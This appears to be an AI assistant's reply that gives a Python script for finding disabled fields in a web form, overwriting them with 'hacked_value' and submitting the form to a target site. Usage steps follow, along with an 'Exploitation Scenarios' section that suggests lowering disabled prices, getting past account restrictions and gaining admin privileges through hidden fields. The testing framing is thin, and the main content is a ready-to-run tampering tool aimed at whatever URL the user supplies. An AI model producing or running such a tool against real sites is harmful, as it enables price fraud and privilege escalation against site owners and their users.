Here’s a **Python automation script** to **test form submission** with **modified disabled elements**. It will:  

✅ **Find disabled form fields** on a webpage.  
✅ **Modify and enable** the fields.  
✅ **Submit the modified form** to the server.  
✅ **Check if the modification was accepted** by analyzing the response.  

---

### **📝 Python Script: Modify & Submit Disabled Fields**
```python
import requests
from bs4 import BeautifulSoup

# Target URL (Change this to your target)
URL = "https://example.com/profile"

# Headers to mimic a real browser
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Session for maintaining cookies & authentication
session = requests.Session()

def find_and_modify_disabled_fields(url):
    """Finds, modifies, and submits disabled form fields."""
    # Step 1: Fetch the page
    response = session.get(url, headers=HEADERS)
    soup = BeautifulSoup(response.text, "html.parser")

    # Step 2: Find all forms
    forms = soup.find_all("form")
    
    if not forms:
        print("[!] No forms found on the page.")
        return

    for form in forms:
        action = form.get("action")  # Get form submission URL
        form_url = url if not action else action

        # Step 3: Extract all input fields
        form_data = {}
        for input_tag in form.find_all("input"):
            name = input_tag.get("name")
            value = input_tag.get("value", "")

            # Step 4: Modify disabled fields
            if input_tag.has_attr("disabled"):
                print(f"[!] Found disabled field: {name} = {value}")
                form_data[name] = "hacked_value"  # Modify value
            else:
                form_data[name] = value  # Keep other values unchanged

        # Step 5: Submit modified form
        print(f"[*] Submitting modified form to: {form_url}")
        submit_response = session.post(form_url, data=form_data, headers=HEADERS)

        # Step 6: Analyze response
        if "error" not in submit_response.text.lower():
            print("[+] Submission successful! Disabled field was accepted. 🚀")
        else:
            print("[-] Server rejected the modified submission.")

if __name__ == "__main__":
    find_and_modify_disabled_fields(URL)
```

---

### **🛠 How to Use**
1️⃣ **Install dependencies** (if not installed):  
   ```bash
   pip install requests beautifulsoup4
   ```
2️⃣ **Modify `URL`** with your target web application.  
3️⃣ **Run the script**:  
   ```bash
   python script.py
   ```
4️⃣ **Check the output**: If the modified form submission **succeeds**, the site is vulnerable! 🎯

---

### **🔥 Exploitation Scenarios**
🔹 **Changing Disabled Discounts:** If a price field is disabled, you can modify it and submit a lower price.  
🔹 **Bypassing Account Restrictions:** Some accounts have restricted actions (e.g., "Delete User" disabled). Enable it and submit.  
🔹 **Unlocking Hidden Features:** Some hidden fields might grant admin privileges when modified.
